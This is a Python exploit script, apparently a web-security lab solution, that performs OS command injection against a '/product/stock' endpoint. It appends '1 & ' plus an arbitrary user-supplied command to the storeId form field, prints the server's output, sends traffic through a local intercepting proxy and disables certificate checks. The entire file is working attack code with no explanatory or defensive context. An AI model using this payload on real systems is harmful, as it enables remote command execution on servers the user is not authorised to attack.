import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, command):
    stock_path = '/product/stock'
    command_injection = '1 & ' + command
    params = {'productId': '1', 'storeId': command_injection}
    
    try:
        # Make a POST request to the target URL with the command injection payload
        r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
        
        if r.status_code == 200:
            if len(r.text) > 3:
                print("(+) Command injection successful!")
                print("(+) Output of command: " + r.text)
            else:
                print("(-) Command injection failed: No output.")
        else:
            print("(-) Request failed with status code: %d" % r.status_code)
    except requests.exceptions.RequestException as e:
        print("(-) An error occurred: %s" % str(e))

def main():
    # Prompt the user for input
    url = input()
    command = input()
    
    print("(+) Exploiting command injection...")
    run_command(url, command)

if __name__ == "__main__":
    main()
